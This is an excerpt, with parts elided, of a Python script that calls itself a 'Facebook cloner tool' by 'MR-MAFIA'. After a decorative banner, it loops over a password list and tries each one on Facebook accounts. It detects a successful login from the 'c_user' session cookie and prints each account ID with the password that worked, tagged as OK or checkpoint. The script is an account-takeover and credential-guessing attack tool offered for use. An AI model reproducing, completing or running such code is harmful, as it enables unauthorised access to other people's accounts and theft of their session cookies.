...
def banner():
	os.system("clear")
	print("")
	print("%s    𝐌𝐀𝐅𝐈𝐀 𝐅𝐁 𝐂𝐋𝐎𝐍𝐄𝐑 𝐓𝐎𝐎𝐋 "%(Z))
	print("")
	print("%s╔══════════════════════════════════════════╗"%(Z))
	print("%s║%s  Author   : %sMR-MAFIA                   %s║"%(Z,B,M,Z))
	print("%s║%s  Github   : https://github.com/Mr-Mafia %s║"%(Z,B,Z))
	print("%s║%s  Telegram : https://t.me/MR-MAFIA       %s║"%(Z,B,Z))
	...
	try:
		for pasw in pwx:
			...
			if 'c_user' in fb_cookies:
				...
				uidx = coki[65:80]
				print('\033[1;32m [MAFIA-OK] '+uidx+'|'+pasw+'\033[0;97m')
				...
				coki=";".join([key+"="+value for key,value in ses.cookies.get_dict().items()])
				uidx = coki[82:97]
				print('\033[1;31m [MAFIA-CP] '+uidx+' | '+pasw+'\033[0;97m')
